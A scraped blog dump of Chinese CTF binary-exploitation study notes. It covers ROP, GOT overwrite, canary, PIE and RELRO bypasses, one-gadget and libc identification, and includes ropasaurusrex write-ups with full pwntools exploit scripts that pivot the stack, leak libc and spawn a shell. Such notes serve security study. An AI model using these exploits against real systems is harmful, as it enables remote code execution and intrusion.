getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记17:其他一些技术简介","slug":"Pwn学习笔记17-其他一些技术简介","date":"2019-05-13T02:39:04.000Z","updated":"2019-05-13T02:40:04.630Z","comments":true,"path":"2019/05/13/Pwn学习笔记17-其他一些技术简介/","link":"","permalink":"https://darkwing.moe/2019/05/13/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B017-%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/","excerpt":"","text":"PartialOverwrite 只更改func@got低位两个字节的值，可以替换为前后0x0000~0xffff范围内的地址 修改的两个字节中，ASLR只影响高4位(低12位不受ASLR影响) 也就是说，即使不泄漏地址，也有1/16的概率调用到想要的地址 重写stack上返回地址的低位三个字节也是可能的 CAROP(potetisensei和自己命名) 意思是Calc&amp;AdjustROP，在func@got中，修正必要的差异，更改为想要的函数 首先，需要泄漏一些地址，确定libc，确定函数偏移 只需要pop ecx; pop ebx; add [ecx], ebx; call [ecx]; 这些ROP 不需要泄漏内存就可能调用system，可以用更少的ROP 31c3 CTF – pwn30 cairo vtable攻略(no-NX时__libc_start_main的Wrapping) 只能任意更改vptr，可以指定成员函数的第一个参数字符串的情况 使vptr指向__libc_start_main@got之前一点，并在第一个参数字符串中写入shellcode 即使无法指定函数自身的地址，__libc_start_main也会作为Wrapper执行 SECUINSIDE 2014 final – pwn300 notes Thiscall攻略 可以控制指向object的指针，像thiscall一样，将第一个参数设置为自身的情况 预先申请大量内存后执行堆喷射，生成的类似地址字符串0xXX006873指向object(“\\x73\\x68\\x00\\xXX” == “sh¥0”) 在上面伪造的object指针中，将*object-&gt;vptr[i]设置为system() 如果调用该指针函数，会变成*object@0xXX006873-&gt;vptr[i](&quot;sh&quot;),可以使用thiscall SECUINSIDE 2014 final – pwn300 numbers argv[0]泄漏内存 canary检查失败异常结束时，stderr会显示错误信息 错误信息包括文件名，也就是argv[0]，它是栈上的指针 如果在canary检查前覆盖了argv[0]，将显示内存区域泄漏内存 CodeGate 2015 – Pwnable400 beef_steak 与网络环境相关的问题 pwn问题中，由于题目服务器与选手之间距离造成的问题 在发送1000字节或者更多数据造成溢出的情况下，数据传输失败并且溢出失败 read()和recv()以非阻塞模式运行 在这种情况下，可以通过其他pwn问题获取的sell开始对该题目进行exploit 因为题目环境基本是在同一数据中心，相互之间通信速度非常快 即使是巨大的数据，一般也不会产生中断，可以轻松溢出 CSAW CTF 2013 – Exploitation2, 30c3 CTF – PWN400 DOGE2 避免将垃圾传递给system() 如果执行system(垃圾+”;sh”)，前半部分的垃圾字符串会造成执行错误，后半部分的字符串会调用shell 通过user_input覆盖func@got后，可以立即调用func(user_input,…)等 但是，x86中存在限制条件，地址中不能存在NULL Hack.lu 2014 – Exploit400 oreo 服务器上有帮助的文件 在/proc/self/stat中，有ESP和EIP的值。能够通过这个文件帮助获取特定的栈位置 在/proc/self/maps中，有进程自身的内存映射，ASLR环境下非常有帮助 某些情况下，可以通过进程的完整路径中获取到主目录的名称 Hack.lu2014–Exploit500Mario,30c3CTF2013PWN400-DOGE2 dmesg命令 写了进程死因和EIP，可以用来判断进程是否执行了0xCC(=int3命令) CodeGate2015–Pwnable1000icbm(stage2) I/O缓冲区的ROP scanf或者printf之类的，有一个映射区域作为I/O缓冲区(匿名映射的一部分) 可以利用I/O缓冲区进行stack pivot，相对自由的进行ROP SECUINSIDE 2013 – Pwnable750 Pwn me!! 间接引用FSB 在FSB可以多次使用的情况下有效。通常使用基于堆的FSB 在返回__libc_start_main附近，总有一个，栈上的地址-&gt;栈上的地址-&gt;栈上的值，这样的引用 通过第一个引用FSB，修改第二个地址的低位两个字节 通过第二个引用FSB，在栈上写入两个字节任意值 通过第一个引用FSB，修改第二个地址末尾两个字节增加的值 通过第二个引用FSB，在栈上写入两个字节任意值 通过这样重复，可以在栈上写入任意N个字节 FSB结合栈上生成的值作为地址，可以将任意值写入任意内存 Ghost in the shellcode 2015 Teaser – Pwn#1 Citadel, 31c3 CTF – pwn30 pong environ技术 在GOT按以下顺序多次泄漏，获取stack地址 func@got -&gt; libc_base -&gt; _dl_runtime_resolve@libc_got -&gt; ld_base -&gt; environ@ld_bss -&gt; stack 即使对于基于堆的漏洞，也可以通过重复的任意内存泄漏来确定stack地址 DWARF伪造 C++的异常处理是写在一个叫DWARF的数据结构中的，并且是从libgcc的bss区域的handler引用 通过伪造整个引用的DWARF，可以从异常处理返回后跳到任意位置 使用名叫katana的一个工具，可以生成手动更改的DWARF字符串 CodeGate 2013 – Pwnable800 membership, Hack.lu 2014 – Exploit500 breakout 通过retf替换cs寄存器 在x64机器上运行x86二进制文件时有效 如果通过retf将cs寄存器从0x23修改为0x33，就可以将其更改为解释x64指令的模式 在某些情况下，可以绕过系统调用限制 CodeGate 2015 – Pwnable800 rodent (stage2)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记16:PIE与canary","slug":"Pwn学习笔记16-PIE与canary","date":"2019-05-10T07:30:37.000Z","updated":"2019-05-10T07:31:52.222Z","comments":true,"path":"2019/05/10/Pwn学习笔记16-PIE与canary/","link":"","permalink":"https://darkwing.moe/2019/05/10/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B016-PIE%E4%B8%8Ecanary/","excerpt":"","text":"ROP对策 - PIEPIE(Position Independent Executables) .text区域的地址也进行随机化 所有的汇编代码中不包含绝对地址 全都使用相对地址 二进制文件被加载到内存时，基本是随机映射的 没有可以提前确定的固定地址 PIE绕过 – 多段memory leak + ret2libc等 看起来非常严格，因为完全没有固定地址，但如果能够多次利用漏洞，花费时间和精力也能够解决它 通过栈溢出之外的漏洞(例如格式化字符串(FSB)，堆溢出)等泄漏的情况比较多 如果能够知道.text的地址，就能够知道其他例如.data , .bss，.plt，.got.plt 等 如果进一步从.got.plt读取内存，则可以识别libc地址。之后如果能够将其加载到stack上，或者能够重写GOT，就解决了。 Stack Canary很早就出现的机制 gcc编译后，stack上有一个canary值 进入函数时，canary被随机设置 退出该函数时(return 前)，会验证canary没有被修改 根据之前已经提到的技术，很难突破这一层保护 Stack Canary攻略1 – brute force 在重新运行二进制文件之前，Stack Canary的值不会更改 对于fork-server类型，只要主进程没有重新启动，canary就是常量 逐个字节进行爆破的话，最多256*4次尝试就能够命中Stack Canary 如果是x64的话需要256*8次，但无论如何都是一个现实的数字 覆盖Stack Canary为正确的值，这样函数返回时，通过检查，正常返回 Stack Canary攻略2 – master canary forging Stack Canary存储在TLS(Thread local storage)中 x86是在gs:0x14，x64是在fs:0x28存在着值 如果能够重写该值，就能够使Stack Canary无效 将StackCanary修改为想要的值 使用任意内存读写，堆溢出等技术进行覆盖 potetisensei的相关paper http://www.npca.jp/works/magazine/2015_1/ 目前为止的技术总结 技术 推荐练习的问题 nop-sled CodeGate 2013 - pwn100 brute force CodeGate 2013 - pwn100 ret2esp CSAW CTF 2012 - pwn300 - 4842 stager Hack.lu CTF 2012 - pwn300 - braincpy ret2plt Plaid CTF 2013 - pwn200 - ropasaurusrex ret2pop Plaid CTF 2013 - pwn200 - ropasaurusrex ret2libc Plaid CTF 2013 - pwn200 - ropasaurusrex GOT overwrite Plaid CTF 2013 - pwn200 - ropasaurusrex ROP Hack.lu CTF 2012 - pwn300 – braincpy stack pivot Hack.lu CTF 2012 - pwn300 – braincpy ret2dl_runtime_resolve Hack.lu CTF 2014 – pwn400 - oreo _IO_jump_t overwrite ED-CTF – pwn350 – Heap is a tomodachi of mine ld specific ptr overwrite Plaid CTF 2015 – pwn550 - plaiddb canary brute force 30c3 CTF 2014 - pwn400 - bigdata master canary forging CodeGate 2014 – pwn600 - dodosandbox","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记15:Full-RELRO与library","slug":"Pwn学习笔记15-Full-RELRO与library","date":"2019-05-10T02:32:07.000Z","updated":"2019-05-10T02:33:06.681Z","comments":true,"path":"2019/05/10/Pwn学习笔记15-Full-RELRO与library/","link":"","permalink":"https://darkwing.moe/2019/05/10/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B015-Full-RELRO%E4%B8%8Elibrary/","excerpt":"","text":"GOT overwrite对策 – Full-RELRO GOT可以重写会产生问题 Full-RELRO使其只读 这里整个section被设置为只读属性(只能在二进制启动时初始化写入)，Full-RELRO (RELocation Read-Only) 编译选项： gcc -Wl,-z,relro,-z,now NX+ASLR+Full-RELRO绕过1 –ret2dl_runtime_resolve AVtokyo2014上inaz2公开的一项技术 http://www.slideshare.net/inaz2/rop-illmatic-exploring-universal-rop-on-glibc-x8664-ja 利用dl_runtime_resolve和DT_DEBUG在libc中动态查找地址 dl_runtime_resolve是PLT用于动态解析外部函数地址的函数 如果提供类似system()的数据，就能够得到system()的地址 详细参考inaz2的博客 通过ROP stager + Return-to-dl-resolve + DT_DEBUG read绕过 ASLR+DEP+RELRO http://inaz2.hatenablog.com/entry/2014/07/20/161106 x64环境下通过ROP stager + Return-to-dl-resolve + DT_DEBUG read尝试绕过ASLR+DEP+RELRO http://inaz2.hatenablog.com/entry/2014/07/29/020112 NX+ASLR+Full-RELRO绕过2 – _IO_jump_t overwrite 当bss中有stdin/stdout等时有效 瞄准全局变量FILE*指针 http://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/ FILE函数指针指向处有一个函数表 覆盖函数表，当调用例如_IO_file_close()时会调用shellcode或者ROP 即使全局变量中没有fd，libc.so中总会有一个bss 其他的 – libc/ld specific ptr libc.so或者ld.so的bss中，有一些有趣的函数指针 libc_bss+0x08(x86)/0x10(x64):_dl_runtime_resolve@got.plt libc_bss+0x30(x86)/0x38(x64):__tls_get_addr@got.plt ld_bss+0x838(x86)/0xf68(x64):_dl_rtld_lock_recursive ld_bss+0x83c(x86)/0xf70(x64):_dl_rtld_unlock_recursive (以上数据为Ubuntu 14.04 latest中的偏移) 还与一个函数指针表(指针的指针) (x86) libc.so正上方mapped+0x914处的匿名函数指针表 (x64) ld.so正下方mapped+0x6f0处的匿名函数指针表 从__GI___call_tls_dtors调用的函数表 (以上数据为Ubuntu 14.04 latest中的偏移) Ubuntu16.04中许多已经受到保护，但仍有部分可用 如果覆盖这些，exit()时将会自动调用 更改为shellcode地址，将会被执行 可以覆盖任意内存，但不能直接控制EIP/RIP的困难情况 尝试利用之前的地址强行控制EIP/RIP 之后从DROP开始的stack pivot可以做任何事情 实际应用这种情况不多 library地址相关 即使在ASLR下，x86的library地址也是很低的熵 具体来说，只有256种模式(8比特) 可以通过brute force来集中正确的libc_base mmap, vdso, pie时的.text也是同样程度的熵 x64种，熵足够高(28比特)，暴力方式几乎不可能 x86/x64种，library与某些区域的相对距离是固定的 library A与library B library A与mapped library A与0x21000以上size的malloc地址 library A与经过PIE的.text 泄露相关地址后，就能够计算出其他地址 offset需要预先在相同版本ASLR环境下确认 需要注意的是，heap，vdso，stack之间的距离不是固定值","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"进阶ROP及libc","slug":"进阶ROP及libc","date":"2019-05-09T07:02:26.000Z","updated":"2019-05-09T07:03:39.977Z","comments":true,"path":"2019/05/09/进阶ROP及libc/","link":"","permalink":"https://darkwing.moe/2019/05/09/%E8%BF%9B%E9%98%B6ROP%E5%8F%8Alibc/","excerpt":"","text":"有用的ROP技巧__libc_csu_init 从stack中将值加载到寄存器的通用gadget x86和x86_64中都存在，x86_64中这个会很方便 经常找不到pop rdi; ret这类，我们可以通过这种方式设置rdi 可以从stack经过r13设置rdi的值，但是需要注意只能设置32位，因为这里是edi而不是rdi alarm(x) 在x86/x64中，想要通过ROP设置EAX/RAX为任意数值 可以写一个直接调用systemcall的ROP 通常搜索rop gadgets时无法找到pop eax/rax这种 这是一个罕见的命令 可以使用alarm()来代替 CTF问题一般都能很好实现alarm() 通过ret2plt来调用两次alarm(x) -&gt; alarm(0)，EAX/RAX的值将被设置为x 更多信息可以参考man alarm文档 可以使用相同的技术来修改其他函数(例如write)的返回值 Repeat-code 考虑系统调用受到沙箱限制 在例如libc中灵活使用\\xEB\\xFE(jmp $-2) 这样的字节挺好 到达此处时，会发生无限循环 在指令中间，可以进行控制 例如执行memcmp(key,input,n)，根据返回值进行分支ROP 让它跳到jmp $-2 或者会导致SIGSEGV的gadget 如果key和input相等，则会进入无限循环导致连接无响应 如果key和input不同，则会产生SIGSEGV导致断开连接 因为这种差异，即使write/send有限，也可以指定一个字节 One-gadget-RCE x64中要调用system(“/bin/sh”)的话，有几个必要条件 pop rdi “/bin/sh” return system() 需要8*3=24字节的ROP 可以用一种有条件限制的8字节来代替 8字节只是一个ROP，无需带入到ROP中(只需要控制RIP就可以) 只对x64和xinetd类型有效 核心 libc中存在自动执行execve(&quot;/bin/sh&quot;,0,0)的地址 参考DragonSector的资料(http://j00ru.vexillium.org/?p=2485) 但是有条件限制，lea带入到rsi的值需要是NULL x86不存在One-gadget-RCE 因为libc中有PIC，将ebx保存为基指针 需要以ebx+offset的形式访问字符串 如果ebx不包含libc的基地址，则它无法正常工作 如果ebx包含libc的基地址，则可能存在One-gadget-RCE的地址 但是，栈上对应第二个参数的部分需要为NULL(与x64相同) 所以不太现实 在x64中没有基指针这样的东西，它由RIP的相对地址表示 寄存器不必包含特定数字 使用这种技术的概率非常高 进阶ROP类型 JOP (Jump-Oriented Programming) 基于jmp指令而不是return的ROP COP (Call-Oriented Programming) 基于call指令的ROP 习惯构造ROP后，无意中就会用到JOP和COP 在x64中，可以只使用heap伤的JOP/COP进行攻击，而无需使用任何stack数据 SROP(Sigreturn-Oriented Programming) 利用信号中断恢复重写寄存器并简化ROP x86和x64都可以使用，但要注意需要有足够的栈溢出空间 BROP(Blind Return-Oriented Programming) 手边没有二进制原文件的ROP 详细可以参考ntddk的博客 https://ntddk.github.io/2014/09/11/after-rop/ GOT overwrite技术将某个函数的GOT修改为system() 如果存在接受用户输入的函数就太好了 将想要执行的命令作为字符串传递成为函数参数 常见的一些 strlen() 使用strlen(user_input)判断哟ing胡输入长度的情况 strcmp()/memcmp() 使用strcmp(user_input,xxx)或者memcmp(user_input,xxx)将用户输入作为第一个参数的情况 atoi()/strtol() 使用atoi(user_input)或者strtol(user_input,xxx,xxx)将用户输入转换成整数的情况 free() 使用free(user_input_buffer)对用户输入进行free的情况 上述的情况，如果将GOT修改为system()，那么调用时将成为system(user_input) ASLR地址相关技术 通过预先调查，将system()或者”/bin/sh”的地址加载到stack上 。。。 但是，有一个问题 如果对方环境的libc版本不是特定的就不行了 单纯绕过NX的话，可以采用上述方式，但是，如果有ASLR呢 真的不知道libc吗？ libc.so大体上是公开的 deb, rpm之类的都包含有 也就是说，你拥有很多可能的libc 将libc.so转换成DB http://libcdb.com/ 在ASLR下，libc以0x1000为单位被随机化加载 也就是说，末尾12比特(0x00000FFF)不是随机的 使用泄漏的GOT最后12位作为关键字在libcdb中搜索以缩小libc版本范围 如果可以确定libc版本，就可以计算出其他地址，例如”/bin/sh”，DROP gadget等 针对libc DB的对策 当然，如果libc不在DB中就无法搜索 CTF出题人可能会使用自定制libc 这是针对libcdb的对策 绕过”针对libc DB的对策”方式一 使用Gentoo的stage3.tar.bz2中包含的libc.so Gentoo的stage3是每周从源代码构建更新 http://distfiles.gentoo.org/releases/amd64/autobuilds/ 每周的镜像也会公开，可以获取到 出题人自定义libc的话，一般会从最新源码构建 因此与Gentoo的libc.so没有太大区别 方式二 从GOT等中删除地址的末尾12+α位，之后计算libc base 从 libc base开始泄漏大概0x200000字节的数据 根据”exit 0”之类的字符串作为参照查找system地址 方式三 使用ret2dl_runtime_resolve","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"ropasaurusrex level3","slug":"ropasaurusrex-level3","date":"2019-04-23T07:07:23.000Z","updated":"2019-04-23T07:08:20.974Z","comments":true,"path":"2019/04/23/ropasaurusrex-level3/","link":"","permalink":"https://darkwing.moe/2019/04/23/ropasaurusrex-level3/","excerpt":"","text":"至今为止都是调用system(“/bin/sh”)的攻略方式 system()超甜 接下来在chroot环境下运行level2 system()隐式调用”/bin/sh” 调用system(command)时，内部是这样 execve(“/bin/sh”, &amp;[“-c”, command, NULL], envp) 这意味着，chroot环境下，调用system会失败 需要一种没有system()，不访问/bin的攻略方式 两种可能方式： 使用C语言中存在的函数opendir和readdir获取文件名，之后使用open, read, write 来读取Flag 使用mprotect重写.bss的RWX权限，之后在该区域执行shellcode int mprotect(const void *addr, size_t len, int prot); mprotect的定义如上 mprotect()能够更改[addr, addr+len-1]地址范围的访问保护。addr必须与页面边界一致。 bss地址的开头是地址减去偏移量，即0x08049628-0x628 [25] .bss NOBITS 08049628 000628 000008 00 WA 0 0 4 exploit代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# preparing for exploitationwrite_plt &#x3D; 0x0804830cread_plt &#x3D; 0x0804832cpop3ret &#x3D; 0x80484b6write_got &#x3D; 0x8049614read_got &#x3D; 0x804961cdata &#x3D; 0x08049620system_offset &#x3D; 0x0003d200write_offset &#x3D; 0x000e6d80mprotect_offset &#x3D; 0x000f4660bss_addr &#x3D; 0x08049628 + 0x300bss_top_addr &#x3D; 0x08049000leave_ret &#x3D; 0x080482ealog.info(&#39;Pwning&#39;)buf &#x3D; &#39;A&#39; * 136buf +&#x3D; p32(bss_addr-4)buf +&#x3D; p32(read_plt)buf +&#x3D; p32(leave_ret)buf +&#x3D; p32(0)buf +&#x3D; p32(bss_addr)buf +&#x3D; p32(80)shellcode &#x3D; asm(shellcraft.sh())# write(STDOUT, got_write, 4)buf2 &#x3D; p32(write_plt) + p32(pop3ret) + p32(1) + p32(write_got) + p32(4)# read(STDIN, bss+80, len(shellcode))buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) +p32(bss_addr+80) + p32(len(shellcode))# read(STDIN, got_write, 4)buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) + p32(write_got) + p32(4)# write(bss+80) # mprotect(.bss, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)buf2 +&#x3D; p32(write_plt) + p32(bss_addr+80) + p32(bss_top_addr) + p32(0x1000) + p32(7)conn.send(buf)conn.send(buf2)ret &#x3D; u32(conn.recv())print(&#39;write@got: &#123;&#125;&#39;.format(hex(ret)))print(&#39;libc_start: &#123;&#125;&#39;.format(hex(ret - write_offset)))mprotect_addr &#x3D; ret - write_offset + mprotect_offsetprint(&#39;mprotect: &#123;&#125;&#39;.format(hex(mprotect_addr)))conn.send(shellcode)conn.send(p32(mprotect_addr))conn.interactive()","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"ropasaurusrex level2","slug":"ropasaurusrex-level2","date":"2019-04-22T04:32:29.000Z","updated":"2019-04-23T06:57:04.966Z","comments":true,"path":"2019/04/22/ropasaurusrex-level2/","link":"","permalink":"https://darkwing.moe/2019/04/22/ropasaurusrex-level2/","excerpt":"","text":"ROP区域较小的情况 改变read的size 256字节 -&gt; 160字节 限制写入size1$ xxd -p ropasaurusrex | sed -e &#39;s&#x2F;c744240800010000&#x2F;c7442408a0000000&#x2F;&#39; | xxd -r -p &gt; ropasaurusrex2 确认123456789$ diff &lt;(objdump -d -M intel ropasaurusrex) &lt;(objdump -d -M intel ropasaurusrex2)2c2&lt; ropasaurusrex： 文件格式 elf32-i386---&gt; ropasaurusrex2： 文件格式 elf32-i386129c129&lt; 80483fd: c7 44 24 08 00 01 00 mov DWORD PTR [esp+0x8],0x100---&gt; 80483fd: c7 44 24 08 a0 00 00 mov DWORD PTR [esp+0x8],0xa0 只有160字节，无法直接构造ROP 只能够调用一个函数 但是可以使用stack pivot exploit使用stack pivot 这就是类似stager，需要两个阶段的ROP ROP执行stack pivot(stager1) 通过stack pivot执行正常攻略的ROP(stager2) stack pivot之后，与之前的攻略相同 Hint 无法构造一个准备ebp的gadget？ 这个问题中，原本使用了leave ret 不需要讲pop ebp加载到stack上也可以 只需要将目标ebp写到old-ebp leave gadget1234567gdb-peda$ ropsearch &quot;leave&quot; 0x08048000 0x08049000Searching for ROP gadget: &#39;leave&#39; in range: 0x8048000 - 0x80490000x080482ea : (b&#39;c9c3&#39;) leave; ret0x080483f1 : (b&#39;c9c3&#39;) leave; ret0x0804841b : (b&#39;c9c3&#39;) leave; ret0x08048447 : (b&#39;c9c3&#39;) leave; ret0x08048506 : (b&#39;c9c3&#39;) leave; ret exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# preparing for exploitationwrite_plt &#x3D; 0x0804830cread_plt &#x3D; 0x0804832cpop3ret &#x3D; 0x80484b6write_got &#x3D; 0x8049614read_got &#x3D; 0x804961cdata &#x3D; 0x08049620system_offset &#x3D; 0x0003d200write_offset &#x3D; 0x000e6d80bss_addr &#x3D; 0x08049628 + 0x300bss_top_addr &#x3D; 0x08049000leave_ret &#x3D; 0x080482ealog.info(&#39;Pwning&#39;)buf &#x3D; &#39;A&#39; * 136buf +&#x3D; p32(bss_addr-4)buf +&#x3D; p32(read_plt)buf +&#x3D; p32(leave_ret)buf +&#x3D; p32(0)buf +&#x3D; p32(bss_addr)buf +&#x3D; p32(72)# write(STDOUT, got_write, 4)buf2 &#x3D; p32(write_plt) + p32(pop3ret) + p32(1) + p32(write_got) + p32(4)# read(STDIN, data, 8)buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) +p32(data) + p32(8)# read(STDIN, got_write, 4)buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) + p32(write_got) + p32(4)# write(data) # system(&quot;&#x2F;bin&#x2F;sh&quot;)buf2 +&#x3D; p32(write_plt) + p32(0x41424344) + p32(data)conn.send(buf)conn.send(buf2)ret &#x3D; u32(conn.recv())print(&#39;write@got: &#123;&#125;&#39;.format(hex(ret)))print(&#39;libc_start: &#123;&#125;&#39;.format(hex(ret - write_offset)))system_addr &#x3D; ret - write_offset + system_offsetprint(&#39;system: &#123;&#125;&#39;.format(hex(system_addr)))conn.send(&#39;&#x2F;bin&#x2F;sh&#39;+&#39;\\x00&#39;)buf &#x3D; p32(system_addr)conn.send(buf)conn.interactive() return之前4个字节是old-ebp，设置为bss之前4个字节地址。减去4个字节是因为在最终处理时，pop会将old ebp加上4个字节 bss地址加上0x500原因是，在添加函数时，栈会扩展。如果没有添加，则可能会进入到其他区域，其他区域可能不可读写，导致SIGSEGV ??? 喵了个咪的，最开始用的conn.sendline(),一直EOFError，今天看代码忽然想到是不是这个问题，果然是","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Plaid CTF 2013 - pwn200 – ropasaurusrex","slug":"Plaid-CTF-2013-pwn200-–-ropasaurusrex","date":"2019-04-19T02:44:34.000Z","updated":"2019-04-19T02:45:45.017Z","comments":true,"path":"2019/04/19/Plaid-CTF-2013-pwn200-–-ropasaurusrex/","link":"","permalink":"https://darkwing.moe/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/","excerpt":"","text":"Plaid CTF 2013 - pwn200 – ropasaurusrex 根据难度可以分成Level 1 ～ 5 Level 1(原始二进制)会详细讲解 后面的难度自行探索 ropasaurusrex攻略(Level 1)查看x86二进制文件文件可以在这里下载： http://shell-storm.org/repo/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/ 尝试运行一下，大概像这样： 1234$ .&#x2F;ropasaurusrex aaaWIN$ 只启用了NX 12345678$ gdb ropasaurusrex -qgdb-peda$ checksecCANARY : disabledFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : disabledgdb-peda$ __libc_start_main之前push的值是main()函数 12345678int __libc_start_main(int (*main) (int,char**, char**), int argc,char **ubp_av,void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end)); __libc_start_main是glibc(现代Linux标准)中，在调用main()函数之前准备各种东西的包装函数 只有两个函数 大致分析结果 转换成C语言代码大概是这样： 123456789int main(int argc, char **argv, char **envp) &#123; do_read(); return write(STDOUT_FILENO, &quot;WIN\\n&quot;, 4);&#125; void do_read() &#123; char buffer[128]; read(STDIN_FILENO, buf, 256);&#125; 很明显存在stack溢出 128字节的区域中读入256字节内容 溢出前后stack的状态大概是这样 我们使用gdb测试能否直接控制Return Address 漏洞测试 如果能够控制EIP就最好了 只需要发送大量的’A’，通过溢出应该能够覆盖返回地址 但是，在编写exploit时，需要知道具体溢出在哪个字节位置 单纯通过AAAA…来修改返回地址的话，并不能再换掉具体多少个字节能够控制EIP gcc编译优化可能存在align，导致产生偏移 IDA的stack frame显示相对准确，但为了以防万一 通过gdb的pattern来计算出EIP的偏移 123456789101112$ gdb ropasaurusrex -q gdb-peda$ pattern_create 256&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G&#39;gdb-peda$ r &lt;&lt;&lt; &#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G&#39;Starting program: &#x2F;home&#x2F;parallels&#x2F;Desktop&#x2F;ropasaurusrex-200&#x2F;ropasaurusrex &lt;&lt;&lt; &#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G&#39;Program received signal SIGSEGV, Segmentation fault....sProgram received signal SIGSEGV (fault address 0x41416d41)gdb-peda$ pattern_offset 0x41416d411094806849 found at offset: 140gdb-peda$ 可以看到EIP可以被修改为任意值 也获取到了Return Address的偏移是140 140bytes + Return Address + … 存在预期的漏洞，可以利用 尝试很重要 能够控制EIP才能够利用漏洞 之后继续调试编写exploit就可以 动态调试编写exploit前需要注意的 题目环境开启了ASLR(确切的说，大部分CTF都开启了ASLR) 也就是说，需要使用泄漏地址或者类似技术 exploit中需要动态计算和发送地址 对于地址调整，如果不能用gdb动态调试就很麻烦 动态调试环境推荐使用socat结合gdbserver 服务端(终端1) 1234$ vi main.shgdbserver localhost:1234 .&#x2F;ropasaurusrex$ chmod +x main.sh$ socat TCP-LISTEN:1025,reuseaddr,fork EXEC:&quot;.&#x2F;main.sh&quot; 使用socat进行监听，如果有连接则运行gdbserver 攻击端(终端2) 1$ python -c &quot;print &#39;A&#39;*140 + &#39;B&#39;*4&quot; | nc localhost 1025 调试端(终端3) 12345$ vi cmdfile .&#x2F;ropasaurusrextarget remote localhost:1234c$ gdb .&#x2F;ropasaurusrex -q -x cmd 利用gdb的远程调试功能连接到本机的gdbserver 调试如果想要查看每一步的状态或者GOT覆盖状态，可以使用gdb设置好断点 建议设置在0x0804841C附近 因为它是ROP的开始 img 每次都设置断点很麻烦，可以将其写在cmd文件中 12345$ vi cmdfile .&#x2F;ropasaurusrextarget remote localhost:1234b *0x0804841Cc 之后按上节动态调试环境中步骤运行 停在了ret 之后将要返回的是”BBBB”(=0x42424242) 继续执行一条指令 EIP = 0x42424242 仔细构造数据就能够ret2plt或者GOT overwrite 编写exploit 